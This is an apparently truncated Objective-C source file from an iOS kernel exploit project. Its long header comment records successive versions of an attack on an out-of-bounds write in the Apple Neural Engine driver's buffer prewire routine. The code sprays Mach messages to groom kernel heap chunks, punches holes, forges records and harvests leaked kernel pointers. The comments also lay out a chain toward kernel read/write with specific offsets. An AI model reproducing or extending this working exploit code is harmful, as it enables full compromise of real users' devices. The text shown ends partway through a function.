//
//  P088AneWriteHop.m — forged OUTPUT-record write hop. See header.
//
//  v3 (106 triage): race INVERTED + adjacency CONTROLLED + sentinel net.
//
//  Geometry (23F77, insn-locked in P073 header):
//    CheckandPrewire fills table[i*0x10+0]=sid(staged input content),
//    +4=symbol, +8=0x100000001. NO cap cmp in the fill. A 254-in request
//    overflows records 192..253 (0x3E0) into the NEXT kalloc.3072 chunk
//    (chunk size IS 0xC00 — the table end is exactly the next chunk base).
//
//  WHY V2 LOST (106): B was dispatched first and finished in 0-1ms; A's
//    fill lands 4-25ms after A's dispatch. B's [fill->map] window was
//    closed before the forge existed — the race direction was inverted.
//    A's record list also reads back garbage through the smashed neighbor
//    (A err=-1 every round) — that is the punch geometry, not a model bug;
//    A's role is prepare/fill only (the forge), never the consume.
//
//  V3 RACE: A fires FIRST. B = XVRC27_3in127ops_1out (P079 ANE-scheduled,
//    4 records, OUTPUT @0x30 = A's spilled record 195) fires a VOLLEY of
//    sequential predicts at absolute targets so one B [fill->map] window
//    brackets A's fill time. Round schedule: 2 WIDE volleys (1.3ms steps,
//    0.3..20ms) hunt A's fill, then 2 DENSE volleys (0.3ms steps) centered
//    on A's measured predict time. T byte-diff checked after EVERY fire.
//
//  V3 ADJACENCY -> V4 CALIBRATION (23:51 run): the sentinel run is NOT
//    index-contiguous (consecutive kmsg sends pop the freelist LIFO —
//    recently-freed chunks in arbitrary order), so "run direction" was the
//    wrong model. What a D2 hit actually proves: fill target == A_chunk +
//    0xC00, so hit index h with A-hole a means X_h == X_a + 0xC00 EXACTLY.
//    V4 stores that MEASURED PAIR and reuses it every later round: free
//    X_h's kmsg first, X_a's last -> A pops X_a (top), B pops X_h = the
//    chunk physically above A. The fill is its own rangefinder; each round
//    re-verifies (hit == B's chunk -> adjacency CORRECT, window race only).
//    The 23:51 run measured the pair 3/4 rounds (62 fillFlags = the whole
//    192..253 spill in ONE live chunk) — no guard panic in any.
//
//  V3 SECOND ORACLE (105): espresso staging surfaces are IN-PROCESS
//    registry hits (17/24 gap ids, all 16384 = 64x64 BGRA, first-u32 band
//    ~0x5900-0x5E00). Per round: gap-scan above our high-water sid, peek
//    first 16 bytes of every 16384 hit — staging-band evidence of where
//    y went (normal staging vs forged T).
//
//  V5 (two-chunk model, note 111): A's Espresso submit pops TWO
//    kalloc.3072 chunks - queue (freelist top) + record list (second
//    pop); the fill spills from the record chunk into its physical
//    neighbor, so the v4 "calibrated pair" (hA,hB) could never lock by
//    construction. v4 also tore the sentinel run down and rebuilt it
//    every round; the rebuild reversed the freelist each time and walked
//    the fill target +1 per round (28->29->30->31). v5 therefore:
//      1. builds the 32-sentinel run ONCE, tears it down ONCE;
//      2. re-arms every emptied port after each round (refill unlock);
//      3. runs a round-0 single-hole diagnostic (spill-pair probe);
//      4. punches rotating triples on rounds 1..3 - SUPERSEDED by v6:
//         fresh chunks as A's record chunk made the spill target a new
//         coin flip every round (run 1 r1 landed on a guard page ->
//         panic);
//      5. logs ASCII-only (v4c's em-dash mojibake in the POSIX log is
//         gone).
//
//  V6 (both 00:41 + 00:44 panics decoded, note 113): the spill lands in
//    the chunk PHYSICALLY adjacent to A's record chunk - three boot
//    geometries observed:
//      LIVE kmsg   -> D2 hit, safe, measurable (run 1 r0: witness run[31])
//      FREE chunk  -> zone-guard panic "element modified after free" on
//                     the next kalloc.3072 pop (run 2: the panic dumped
//                     our spilled record table: 16-byte records
//                     {u32 sid, u32 symbol=table index, u64 flags
//                     0x100000001} - CheckandPrewire stride i*0x10).
//      GUARD PAGE  -> unmapped next page -> immediate kernel write abort
//                     (run 1 r1; far == record-chunk + 0xC00 exactly,
//                     x8 = the record sid, x20/x26 = the symbol).
//    v6 therefore: r0 measures the pair (single hole, gamble documented);
//    rounds 1-3 run the CONVERSION geometry once the pair is measured -
//    the witness chunk is punched into the volley so B OWNS the spill
//    target (allocated chunks are never guard-checked), the forged
//    record 195 lands at witness+0x30 = B's OUTPUT record slot, and the
//    dense volley hunts B's [fill->map] window. Refill re-arm order at
//    round end: witness first (B freed it last -> freelist top; the
//    fresh kmsg overwrites the forge and heals the chunk), then any D2
//    hit, then the sacrificial queue hole.
//
//  V7 (four 21:xx panics decoded + two structural bugs found, note 114):
//    ALL FOUR 21:03/21:27/21:33/21:41 panics are the SAME class:
//    [data.kalloc.3072] element modified after free at ktextexec+0x83D350,
//    each dumping a 16-byte record table {sid, symbol=0xc0+i, flags
//    0x100000001} whose sids sit in 175-561 - NOT our staged values
//    (aVals were i+1 / forgeSid). Conclusion: A NEVER SPILLED. A's
//    err=-1 is the dead-sid input-loop abort (P080 bee5f818: first bad
//    record aborts) because aVals[i] = i+1 are nonexistent surface ids.
//    Every D2 "hit" and every panic tonight was a FOREIGN ANE job's
//    record table smashing chunks around our zone churn.
//    Second bug: the harvest RECEIVES every port (emptying all 32) but
//    the v5/v6 refill re-armed only 0-2 - the run was DEAD after round
//    0, so rounds 1+ punched EMPTY ports (no-op holes) and A popped
//    stale free chunks -> the free-chunk panics.
//    v7 fixes:
//      1. A's provider stages LIVE SIDS (aVals[i] = gate-pool sid,
//         192-195 = tSid). P077/P080 proved record sid == int(x_i), so
//         A's spilled record 195 now carries tSid = the forge payload.
//         A should COMPLETE (err=-1 must disappear - headline signal).
//      2. FULL reverse-order re-arm after every harvest (receive order
//         = index order -> freelist top = highest index -> re-arm 31..0
//         homes every port AND leaves A's releases on top for the conv).
//      3. Pair-punch measurement: punch (h+1) then (h) -> A pops
//         queue=K_h, record=K_{h+1}; the spill target (K_{h+1}+0xC00) is
//         measured with content verification (our table iff record-195
//         sid == forgeSid; else FOREIGN smash).
//      4. Conv rounds: sacrificial punch -> A record = A's last-released
//         chunk (50% verified-target K_{h+1} / 50% queue chunk K_h;
//         A's release order is per-boot constant), witness+filler punched
//         right after A's dispatch so B's fire0 pops [filler(queue),
//         witness(record)] and B OWNS the spill target during the fill;
//         volley first=1.0ms step=0.7ms x24 (fill timing unknown now
//         that A completes the full pipeline). Bad-case detection: a
//         conv-round D2 hit at w' != witness with OUR table disables
//         conv for the tap.
//      5. Verdict %s->%@ mojibake fix.
//
//  V8 (09:24 panic decoded AT THE PC + note 116 kernel map):
//    The 09:24:17 panic pc (unslid 0x874C1FC, cache slide 0x1ca88000) lands
//    INSIDE cve43748_ANE_ProgramCheckandPrewireBuffers_gated - the fill
//    writer is the ANE driver's buffer prewire: it walks the program's
//    buffer table {sids @prog+0x20 stride 4, flags @prog+0x41c, count
//    @+0x1c} and writes 16-byte memoryMapRequest entries
//    {sid, symbolIndex, 1, 1} into a kalloc.3072 object. 192 entries fit
//    EXACTLY (192*0x10 = 0xC00); entry N >= 192 is the OOB fill into the
//    next chunk. The panic faulted writing entry 192 (x20=x26=0xc0) into
//    a decommitted neighbor page - far in the kernel DATA band.
//    FOREIGN tables (sids 175-561) are big foreign ANE models OOB-filling
//    past their own 0xC00 mapRequest object: the bug class is universal;
//    ours is special only because staged x_i values become the sids.
//    Consequences for the tap:
//      1. A's err=-1 is a DOWNSTREAM reject (the 254-in program is
//         refused AFTER the prewire fill already fired). err=-1 is
//         EXPECTED and NOT the signal; v7's "A must COMPLETE" headline
//         is dropped. The fill fires at PREDICT time (per-inference
//         prewire) - the panic hit mid-r3 right after A's dispatch.
//      2. The record "symbol" field = symbolIndex = the buffer index
//         inside the program (the ANE resource cache is keyed
//         programHandle/surfaceId/symbolIndex - note 116).
//      3. v8 adds an ourBand census per D2 hit: entries whose sid is in
//         our live gate-pool band or == forgeSid. Foreign tables carry
//         driver-bound sids (175-561 band); OUR tables carry gate sids
//         (685+ band) and forgeSid at symbolIndex 195 (0xC3). A hit with
//         ourBand > 0 but no visible 0xC3 = OUR table partially
//         overwritten - separable from foreign for the first time.
//
//  Oracle:
//    T = dedicated 64x64 BGRA marker surface (0x53). A's OOB slots
//    x_192..x_195 = T.sid (slot 195 lands on B's OUTPUT record).
//    Post-fire byte diff on T = ANE WROTE into a surface chosen by a
//    forged record sid = the write hop, in-process. fp16 decode of T's
//    first bytes is logged raw (127ops y is model-defined — no exact-6.0
//    assertion; content control is P080's proven result).
//
//  KRW CHAIN POSITION (102/103/106 — printed in the verdict):
//    1. T byte-diff here        -> hasKwrite=EVIDENCED-INPROC (board event)
//    2. P088_KERNEL_TARGET 1 tap -> kernel-sid completion-only evidence
//    3. Ghidra iomd_field_scan.py (OFF=0x68) -> name the IOMD consumer,
//       vtable+0x650 implementer -> Chain 4 over-release lane
//    4. reclaim + inpcb spray -> read inpcb kaddr -> SocketKRW.Arm
//       (A14_23F77_INPCB_ICMP6FILT 0x148, SO_PCB 0x18)
//    5. kread32(kbase)==0xfeedfacf -> hasKread=YES -> Bootstrap HOLD lifts
//
//  Isolation: ONE TAP per force-quit. PANIC POSSIBLE at the 254 fill
//  (CheckandPrewire+0x18c GZAlloc page-end IPS) and at forged fetches
//  when P088_KERNEL_TARGET 1. Per-line POSIX write + F_FULLFSYNC.
//

#import "P088AneWriteHop.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007Board.h"

#import <CoreML/CoreML.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdarg.h>
#import <string.h>
#import <unistd.h>

#define P088_BUILD @"p088-write-hop-v14-bandpre"

/* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
#define P088_KERNEL_TARGET 0
#define P088_KERNEL_SID    3u     /* pre-boot id, 1..17 pool (P082) */

/* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
#define P088_MSG_SIZE   0x7FCu

/* v3 sentinel run: LIVE kmsgs; the two hole chunks are punched INSIDE the
   run so every overflow target around them is live (no guard panic on a
   miss) and the D2 harvest yields a fill-hit index map. */
#define P088_RUN_N      32u
#define P088_RUN_A0     14u      /* default A-hole index */
#define P088_RUN_B0     15u      /* default B-hole index (intended ABOVE A) */

#define P088_MAGIC      0x50880000u /* "P088" */

/* fire geometry */
#define P088_INPUTS     254u
#define P088_OOB_FIRST  192u
#define P088_ADDCHAIN   @"XVRC27_254in_1out_addchain"
/* consumer = 3in127ops (P079 ANE-scheduled). SAME 4-record geometry
   (output @0x30, reachable) but 126 ops => long ANE prepare => the
   fill->map race window v1 could never land in. */
#define P088_CONSUMER   @"XVRC27_3in127ops_1out"
/* gate = the P082/P080-proven instrument: 127-in live-sid timing. */
#define P088_GATE_MODEL @"XVRC27_127in_1out"
#define P088_GATE_N     127u
#define P088_GATE_SURF  128u
#define P088_N_IN_B     3u

/* volley schedule (106: race inverted; A first, B hunts A's fill time) */
#define P088_ROUNDS          4u
#define P088_VOL_WIDE        16u     /* rounds 0-1: hunt 0.3..20ms */
#define P088_VOL_WIDE_STEP   1.3     /* ms */
#define P088_VOL_DENSE       16u     /* rounds 2-3: centered on A's fill */
#define P088_VOL_DENSE_STEP  0.3     /* ms */
#define P088_VOL_FIRST_MS    0.3
/* v7 conv volley: A now COMPLETES (live-sid staging), fill timing unknown
   -> early wide volley (fire0 punches B's queue/record right after A's
   dispatch, so B owns the spill target from ~1ms onward). */
#define P088_VOL_CONV        24u
#define P088_VOL_CONV_STEP   0.7

/* staging-band second oracle (105) */
#define P088_STAGE_SCAN_N    256u
#define P088_STAGE_SIZE      16384u

/* target surface */
#define P088_T_MARK     0x53u

/* fill fingerprint */
#define P088_FILL_FLAG  0x0000000100000001ULL
#define P088_KVA_MIN    0xFFFFFF8000000000ULL
#define P088_KVA_MAX    0xFFFFFFFFFF000000ULL

_Static_assert(P088_MSG_SIZE + 0x24 == 0x820, "kdata must match ANE table class");

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*p088_iosCreate_t)(CFDictionaryRef);
typedef IOSurfaceRef (*p088_iosLookup_t)(uint32_t);
typedef uint32_t (*p088_iosGetID_t)(IOSurfaceRef);
typedef void *(*p088_iosBase_t)(IOSurfaceRef);
typedef size_t (*p088_iosAllocSz_t)(IOSurfaceRef);
typedef kern_return_t (*p088_iosLock_t)(IOSurfaceRef, uint32_t, uint32_t *);

typedef struct { mach_port_t port; uint32_t index; BOOL alive; } p088_held_t;

typedef struct {
    IOSurfaceRef surf;
    uint32_t     sid;
    size_t       allocSize;
} p088_surf_t;

static void p088_free_surfs(p088_surf_t *arr, uint32_t n) {
    for (uint32_t i = 0; i < n; i++) if (arr[i].surf) CFRelease(arr[i].surf);
    free(arr);
}

static int g_p088_fd = -1;
static NSMutableString *g_p088_buf;
/* v7 content verification: record 195 (symbol 0xC3) sid == forgeSid iff
   OUR spilled table landed in the smashed chunk; else the smash is a
   FOREIGN ANE job's record table (all four 21:xx panics were foreign). */
static uint32_t g_p088_forgeSid = 0;
static int      g_p088_hitOurs = 0;   /* set by p088_harvest_one on a hit */
/* v8 ourBand census: D2 entries whose sid is ours (gate-pool band or
   forgeSid) vs foreign driver-bound sids (175-561 band tonight). */
static uint32_t g_p088_minGateSid = 0;
static uint32_t g_p088_maxGateSid = 0;
/* v11: the fresh-A instance allocates ~250 NEW staging IOSurfaces per round
   (ids above the gate pool — 824..1067 tonight) and the record stream's sids
   are THOSE (sid reuse on instance release makes rounds identical). The v10
   static band (gate pool + ~175-561 foreign) misread OUR tables as foreign,
   so hitOurs stayed 0, the witness never armed, and B fired 0 times.
   g_p088_stageMax is extended by every p088_stage_scan hit; ours-census =
   sid in [minGateSid .. stageMax] or == forgeSid. */
static uint32_t g_p088_stageMax = 0;
static uint32_t g_p088_lastOurBand = 0;   /* census of the last harvested hit */
static uint32_t g_p088_ourBandTotal = 0;  /* cumulative across the tap */
/* v9 zone-cookie census: records whose symbolIndex byte sits in 0xC0..0xFF
   = OOB indexes 192..255 (the spill band; in-bounds records are 0x00..0xBF).
   Panic evidence (notes 113/114): dumped tables carry symbol=0xc0+i and the
   09:24 pc faulted at x20=x26=0xc0. A record counts as OURS only on the
   FULL triple {+0x00 sid == forgeSid/gate band, +0x04 symbol in cookie
   band, +0x08 flags == 0x100000001} - err==0 is never part of the signal. */
static uint32_t g_p088_lastCookie = 0;
static uint32_t g_p088_cookieTotal = 0;

static void p088_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P088AneWriteHop class]) {
        if (g_p088_buf) [g_p088_buf appendString:out];
        if (g_p088_fd >= 0) {
            const char *s = out.UTF8String;
            if (s) {
                write(g_p088_fd, s, strlen(s));
                fcntl(g_p088_fd, F_FULLFSYNC);
            }
        }
    }
}

#pragma mark - IOSurface

static p088_iosCreate_t  s_iosCreate;
static p088_iosLookup_t  s_iosLookup;
static p088_iosGetID_t   s_iosGetID;
static p088_iosBase_t    s_iosBase;
static p088_iosAllocSz_t s_iosAllocSz;
static p088_iosLock_t    s_iosLock;
static p088_iosLock_t    s_iosUnlock;

static BOOL p088_resolve_iosurface(void) {
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) h = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return NO;
    s_iosCreate  = (p088_iosCreate_t)dlsym(h, "IOSurfaceCreate");
    s_iosLookup  = (p088_iosLookup_t)dlsym(h, "IOSurfaceLookup");
    s_iosGetID   = (p088_iosGetID_t)dlsym(h, "IOSurfaceGetID");
    s_iosBase    = (p088_iosBase_t)dlsym(h, "IOSurfaceGetBaseAddress");
    s_iosAllocSz = (p088_iosAllocSz_t)dlsym(h, "IOSurfaceGetAllocSize");
    s_iosLock    = (p088_iosLock_t)dlsym(h, "IOSurfaceLock");
    s_iosUnlock  = (p088_iosLock_t)dlsym(h, "IOSurfaceUnlock");
    return s_iosCreate && s_iosGetID && s_iosBase && s_iosAllocSz && s_iosLock && s_iosUnlock;
}

static CFNumberRef p088_cfnum(uint64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static IOSurfaceRef p088_surface_create(uint32_t w, uint32_t hgt) {
    CFNumberRef cw = p088_cfnum(w), ch = p088_cfnum(hgt);
    CFNumberRef bpe = p088_cfnum(4), fmt = p088_cfnum(0x42475241); /* BGRA */
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat") };
    const void *vals[] = { cw, ch, bpe, fmt };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
                                               &kCFTypeDictionaryKeyCallBacks,
                                               &kCFTypeDictionaryValueCallBacks);
    CFRelease(cw); CFRelease(ch); CFRelease(bpe); CFRelease(fmt);
    if (!props) return NULL;
    IOSurfaceRef s = s_iosCreate(props);
    CFRelease(props);
    return s;
}

static void p088_surface_fill(IOSurfaceRef s, uint8_t mark) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz == 0 || sz > (16UL << 20)) return;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return;
    memset(base, mark, sz);
    s_iosUnlock(s, 0, NULL);
}

static float p088_half2float(uint16_t h) {
    uint32_t sign = (h & 0x8000u) << 16;
    uint32_t exp  = (h & 0x7C00u) >> 10;
    uint32_t man  = (h & 0x03FFu);
    uint32_t bits;
    if (exp == 0) {
        if (man == 0) { bits = sign; }
        else {
            int e = -1;
            uint32_t m = man;
            do { e++; m <<= 1; } while ((m & 0x0400u) == 0);
            bits = sign | ((127 - 15 - e) << 23) | ((m & 0x03FFu) << 13);
        }
    } else if (exp == 0x1F) {
        bits = sign | 0x7F800000u | (man << 13);
    } else {
        bits = sign | ((exp - 15 + 127) << 23) | (man << 13);
    }
    float f; memcpy(&f, &bits, 4); return f;
}

/* returns 1 if bytes differ from mark; dumps first 16 raw + fp16 pairs */
static int p088_surface_diff(IOSurfaceRef s, uint32_t sid, const char *label) {
    void *base = s_iosBase(s);
    size_t sz = s_iosAllocSz(s);
    if (!base || sz < 16) return 0;
    if (s_iosLock(s, 0, NULL) != KERN_SUCCESS) return 0;
    const uint8_t *b = (const uint8_t *)base;
    uint32_t diff = 0;
    for (size_t k = 0; k < sz; k++) { if (b[k] != P088_T_MARK) { diff++; if (diff >= 64) break; } }
    s_iosUnlock(s, 0, NULL);
    if (!diff) return 0;
    /* fp16 pairs from the first 8 bytes (y should be a small half float) */
    uint16_t h0, h1, h2, h3;
    memcpy(&h0, b, 2); memcpy(&h1, b + 2, 2); memcpy(&h2, b + 4, 2); memcpy(&h3, b + 6, 2);
    p088_log(@"  [+] %s TOUCHED sid=%u diff>=%u first16 %02x %02x %02x %02x %02x %02x %02x %02x"
             @" %02x %02x %02x %02x %02x %02x %02x %02x",
             label, sid, diff, b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7],
             b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]);
    p088_log(@"      fp16 decode @0: %.6g %.6g %.6g %.6g (127ops y is model-defined)",
             p088_half2float(h0), p088_half2float(h1), p088_half2float(h2),
             p088_half2float(h3));
    return 1;
}

#pragma mark - kmsg spray

static mach_port_t p088_make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS)
        return MACH_PORT_NULL;
    if (mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    return port;
}

static BOOL p088_send_simple(mach_port_t port, uint32_t index) {
    uint8_t buf[P088_MSG_SIZE];
    memset(buf, 0xA5, sizeof(buf));
    uint8_t *body = buf + sizeof(mach_msg_header_t);
    memcpy(body, "P088", 4);
    uint32_t tag = index ^ P088_MAGIC;
    memcpy(body + 4, &tag, 4);
    mach_msg_header_t *h = (mach_msg_header_t *)buf;
    h->msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    h->msgh_size        = P088_MSG_SIZE;
    h->msgh_remote_port = port;
    h->msgh_local_port  = MACH_PORT_NULL;
    h->msgh_id          = (int)(P088_MAGIC | (int)(index & 0xFFFFu));
    return mach_msg(h, MACH_SEND_MSG, P088_MSG_SIZE, 0,
                    MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) == MACH_MSG_SUCCESS;
}

/* receive + discard the queued kmsg: frees the kernel kmsg buffer (hole) */
static void p088_punch(mach_port_t port) {
    uint8_t rbuf[P088_MSG_SIZE + 64];
    memset(rbuf, 0, sizeof(rbuf));
    mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
    mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, (mach_msg_size_t)sizeof(rbuf),
             port, 0, MACH_PORT_NULL);
}

/* v13 magazine pre-conditioning (venice handoff §magazine state: the zone
   magazine is 8 slots / half / CPU, LIFO, free-half swaps into the alloc
   half at capacity; data.kalloc shares the same machinery + insert path
   0x9e80b1c). The v10-v12 boots' fills landed wherever leftover magazine
   / freelist depth put them (0 D2-hit boots + the sentPre/sentPost edge
   landings). Prefill the free half to depth-6 ON THE TAP THREAD (same CPU
   as the punches AND A's prewire; A14 THREAD_AFFINITY is a hint only so
   everything stays on one thread), then the round's 2 punches complete
   the half -> swap -> A's pop = the last-punched hole, DETERMINISTIC. */
static void p088_mag_prefill(uint32_t cycles) {
    for (uint32_t i = 0; i < cycles; i++) {
        mach_port_t p = p088_make_port();
        if (p == MACH_PORT_NULL) return;
        if (p088_send_simple(p, 0x4D00u | (i & 0xFFu))) {
            uint8_t rbuf[P088_MSG_SIZE + 64];
            memset(rbuf, 0, sizeof(rbuf));
            mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
            mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                     (mach_msg_size_t)sizeof(rbuf), p, 0, MACH_PORT_NULL);
        }
        mach_port_destroy(mach_task_self(), p);
    }
}

/* v6 refill heal: resend a fresh kmsg into an emptied port. New kmsgs
   land on the freelist top - the chunks the predict just released - so
   re-arming in a controlled order restores a stable port->chunk map. */
static void p088_rearm(p088_held_t *v) {
    if (v->port == MACH_PORT_NULL) return;
    if (p088_send_simple(v->port, v->index)) {
        v->alive = YES;
    } else {
        p088_log(@"  [REFILL] run[%u] re-arm FAILED", v->index);
    }
}

/* D2: 1 = clean, 0 = gone/timeout, -1 = FILL HIT (mutated) */
static int p088_harvest_one(p088_held_t *v, const char *label) {
    uint8_t rbuf[P088_MSG_SIZE + 64];
    memset(rbuf, 0, sizeof(rbuf));
    mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
    mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                    (mach_msg_size_t)sizeof(rbuf), v->port, 0, MACH_PORT_NULL);
    if (mr == MACH_RCV_TIMED_OUT) return 0;
    if (mr != MACH_MSG_SUCCESS) return 0;
    uint8_t *body = rbuf + sizeof(mach_msg_header_t);
    uint32_t expect = v->index ^ P088_MAGIC;
    BOOL markerOK = (memcmp(body, "P088", 4) == 0 && memcmp(body + 4, &expect, 4) == 0);
    uint64_t *q = (uint64_t *)body;
    uint32_t nq = (P088_MSG_SIZE - (uint32_t)sizeof(mach_msg_header_t)) / 8;
    uint32_t fillHits = 0, kptrs = 0, ourBand = 0, cookieBand = 0;
    for (uint32_t w = 0; w < nq; w++) {
        if (q[w] == P088_FILL_FLAG) {
            fillHits++;
            /* v8 census: entry = {u32 sid, u32 symbolIndex} at q[w-1].
               OURS iff sid is in our live gate-pool band or == forgeSid;
               foreign tables carry driver-bound sids (175-561 tonight). */
            uint32_t rsid = (uint32_t)q[w - 1];
            uint32_t rsym = (uint32_t)(q[w - 1] >> 32);
            /* v11 ours-census: gate pool band, or staging band (fresh-A
               staging grows g_p088_stageMax each round's stage scan —
               v10 proved the fills carry those sids), or == forgeSid. */
            if ((g_p088_minGateSid && rsid >= g_p088_minGateSid &&
                 rsid <= g_p088_stageMax) || rsid == g_p088_forgeSid)
                ourBand++;
            /* v9 zone-cookie: symbolIndex 0xC0..0xFF = OOB record band. */
            if (rsym >= 0xC0u && rsym <= 0xFFu) cookieBand++;
        }
        if (q[w] >= P088_KVA_MIN && q[w] < P088_KVA_MAX) {
            kptrs++;
            [[P007Board shared] recordCandidate:q[w]
                                          kind:(((q[w] >> 32) == 0xFFFFFFF0ULL) ? @"text_ptr" : @"heap_ptr")
                                        source:@"p088_harvest"];
        }
    }
    if (!markerOK || fillHits) {
        p088_log(@"  [D2] FILL HIT %s[%u] fillFlags=%u kptrs=%u ourBand=%u cookieBand=%u",
                 label, v->index, fillHits, kptrs, ourBand, cookieBand);
        /* records are {u32 sid, u32 symbol, u64 flags} — dump the first 3 */
        uint32_t shown = 0;
        for (uint32_t w = 1; w < nq && shown < 3; w++) {
            if (q[w] == P088_FILL_FLAG) {
                uint32_t rsid = (uint32_t)q[w - 1];
                BOOL ours = (g_p088_minGateSid && rsid >= g_p088_minGateSid &&
                             rsid <= g_p088_stageMax) || rsid == g_p088_forgeSid;
                p088_log(@"      rec sid=%u symbol=0x%08x %@%@",
                         rsid, (uint32_t)(q[w - 1] >> 32),
                         ours ? @"OURS-BAND" : @"foreign-band",
                         ((q[w - 1] >> 32) >= 0xC0u && (q[w - 1] >> 32) <= 0xFFu)
                             ? @" [cookie-band]" : @"");
                shown++;
            }
        }
        /* v7 content check: record 195 = symbol 0xC3 (CheckandPrewire
           stride i*0x10; record 195 lands on B's OUTPUT record slot).
           sid == forgeSid -> OUR forge table spilled here; any other sid
           (tonight's panics: 175-561 band) -> a FOREIGN ANE job's table. */
        g_p088_hitOurs = 0;
        for (uint32_t w = 1; w < nq; w++) {
            if (q[w] == P088_FILL_FLAG && (uint32_t)(q[w - 1] >> 32) == 0xC3u) {
                uint32_t rsid = (uint32_t)q[w - 1];
                g_p088_hitOurs = (rsid == g_p088_forgeSid) ? 1 : 0;
                p088_log(@"      record-195 sid=%u %s (forgeSid=%u)",
                         rsid,
                         g_p088_hitOurs ? "OURS - FORGE TABLE CONFIRMED in-kernel"
                                        : "FOREIGN smash (not a geometry measurement)",
                         g_p088_forgeSid);
                break;
            }
        }
        if (!g_p088_hitOurs) {
            /* v9 hardened fallback: record 195 need not be in view - ANY
               record on the full triple {sid == forgeSid, symbol in the
               0xC0..0xFF cookie band, flags == FILL_FLAG} is our forge. */
            for (uint32_t w = 1; w < nq; w++) {
                if (q[w] == P088_FILL_FLAG) {
                    uint32_t sym = (uint32_t)(q[w - 1] >> 32);
                    if (sym >= 0xC0u && sym <= 0xFFu &&
                        (uint32_t)q[w - 1] == g_p088_forgeSid) {
                        g_p088_hitOurs = 1;
                        p088_log(@"      cookie-band record sym=0x%02x sid=%u == "
                                 @"forgeSid (record 195 out of view; forge present)",
                                 sym, g_p088_forgeSid);
                        break;
                    }
                }
            }
        }
        if (!g_p088_hitOurs) {
            if (ourBand > 0)
                p088_log(@"      (no 0xC3 record visible but ourBand=%u: OUR table, "
                         @"partially overwritten - forge slot out of view)", ourBand);
            else
                p088_log(@"      (no 0xC3 record visible and ourBand=0: FOREIGN table)");
        }
        g_p088_lastOurBand = ourBand;
        g_p088_lastCookie = cookieBand;
        return -1;
    }
    return 1;
}

#pragma mark - staging-band second oracle (105)

/* gap-scan above hiSeen: log every 16384-byte (64x64 BGRA) registry hit
   and peek its first 16 bytes. Updates hiSeen to the highest hit found. */
static void p088_stage_scan(uint32_t *hiSeen) {
    if (!s_iosLookup) return;
    uint32_t hi = *hiSeen;
    uint32_t hits = 0;
    NSMutableString *band = [NSMutableString string];
    for (uint32_t k = 1; k <= P088_STAGE_SCAN_N; k++) {
        uint32_t sid = hi + k;
        IOSurfaceRef s = s_iosLookup(sid);
        if (!s) continue;
        size_t sz = s_iosAllocSz(s);
        if (sz == P088_STAGE_SIZE) {
            hits++;
            if (hi + k > *hiSeen) *hiSeen = hi + k;
            if (hi + k > g_p088_stageMax) g_p088_stageMax = hi + k;
            if (s_iosLock(s, 0, NULL) == KERN_SUCCESS) {
                const uint8_t *b = (const uint8_t *)s_iosBase(s);
                if (b && sz >= 16) {
                    uint32_t u0, u1, u2, u3;
                    memcpy(&u0, b, 4); memcpy(&u1, b + 4, 4);
                    memcpy(&u2, b + 8, 4); memcpy(&u3, b + 12, 4);
                    if (hits <= 24)
                        [band appendFormat:@" %u:%08x", sid, u0];
                    if (hits == 1)
                        p088_log(@"  [stage] first hit sid=%u u32s %08x %08x %08x %08x",
                                 sid, u0, u1, u2, u3);
                }
                s_iosUnlock(s, 0, NULL);
            }
        }
        CFRelease(s);
    }
    p088_log(@"  [stage] scan [%u..%u]: %u hits (16384 B) hiSeen->%u first-u32 band:%@",
             hi + 1, hi + P088_STAGE_SCAN_N, hits, *hiSeen,
             band.length ? band : @" (none)");
}

#pragma mark - CoreML

static NSURL *p088_model_url(NSString *name) {
    NSBundle *b = [NSBundle mainBundle];
    NSURL *u = [b URLForResource:name withExtension:@"mlmodelc"];
    if (u) return u;
    return [b URLForResource:name withExtension:@"mlpackage"];
}

static MLModel *p088_load(NSURL *url, MLComputeUnits units, NSError **errOut) {
    MLModelConfiguration *cfg = [[MLModelConfiguration alloc] init];
    cfg.computeUnits = units;
    return [MLModel modelWithContentsOfURL:url configuration:cfg error:errOut];
}

static MLDictionaryFeatureProvider *p088_provider(const double *vals, uint32_t nIn,
                                                  NSString *firstKey, NSError **errOut) {
    NSMutableDictionary *features = [NSMutableDictionary dictionary];
    for (uint32_t i = 0; i < nIn; i++) {
